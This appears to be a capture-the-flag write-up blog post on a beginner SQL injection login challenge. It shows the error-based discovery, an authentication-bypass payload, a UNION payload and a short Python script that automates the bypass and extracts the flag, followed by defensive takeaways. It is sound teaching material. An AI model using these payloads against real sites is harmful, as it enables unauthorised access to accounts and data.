---
title: "Sample Web Challenge - SQL Injection"
date: 2024-01-15T10:00:00+07:00
draft: false
description: "A beginner-friendly SQL injection challenge from Example CTF 2024"
categories: ["Web"]
tags: ["SQL Injection", "Web Security", "SQLi"]
ctfs: ["Example CTF 2024"]
author: "Zicc0Nguyen"
ShowToc: true
TocOpen: true
---

## Challenge Information

- **CTF:** Example CTF 2024
- **Category:** Web Exploitation
- **Difficulty:** Easy
- **Points:** 100
- **Solves:** 234

## Description

You are given a login page that appears to be vulnerable to SQL injection. Can you bypass the authentication and retrieve the flag?

**Challenge URL:** `http://example-ctf.com/login`

## Reconnaissance

First, I tested the login form with some basic inputs to understand its behavior:

```http
POST /login HTTP/1.1
Host: example-ctf.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123
```

The response indicated that the credentials were invalid. Time to test for SQL injection!

## Vulnerability Analysis

Testing with a single quote `'` in the username field:

```sql
username: admin'
password: anything
```

This resulted in an SQL error being displayed, confirming the vulnerability:

```
Error: You have an error in your SQL syntax near ''admin''' at line 1
```

This suggests the backend query looks something like:

```sql
SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'
```

## Exploitation

### Method 1: Classic Authentication Bypass

Using the classic SQL injection authentication bypass:

```sql
Username: admin' OR '1'='1' --
Password: anything
```

This transforms the query into:

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='anything'
```

The `--` comments out the rest of the query, and `'1'='1'` is always true, bypassing authentication.

### Method 2: Union-Based Injection

Alternatively, we can extract data using UNION-based injection:

```sql
' UNION SELECT null, null, 'admin', 'flag{fake_flag_here}' --
```

### Automation Script

I wrote a quick Python script to automate the exploitation:

```python
#!/usr/bin/env python3
import requests

url = "http://example-ctf.com/login"
payload = {
    "username": "admin' OR '1'='1' --",
    "password": "anything"
}

response = requests.post(url, data=payload)

if "flag{" in response.text:
    # Extract flag using regex
    import re
    flag = re.search(r'flag\{[^}]+\}', response.text).group()
    print(f"[+] Flag found: {flag}")
else:
    print("[-] Flag not found")
    print(response.text)
```

Running the script:

```bash
$ python3 exploit.py
[+] Flag found: flag{sql_1nj3ct10n_1s_ez}
```

## Flag

```
flag{sql_1nj3ct10n_1s_ez}
```

## Key Takeaways

1. **Always sanitize user input** - Never trust user-supplied data
2. **Use prepared statements** - Parameterized queries prevent SQL injection
3. **Implement proper error handling** - Don't expose SQL errors to users
4. **Apply principle of least privilege** - Database users should have minimal permissions

## Tools Used

- Burp Suite - For intercepting and modifying requests
- Python + requests - For automation
- SQLMap - Could also be used for automated exploitation

## References

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
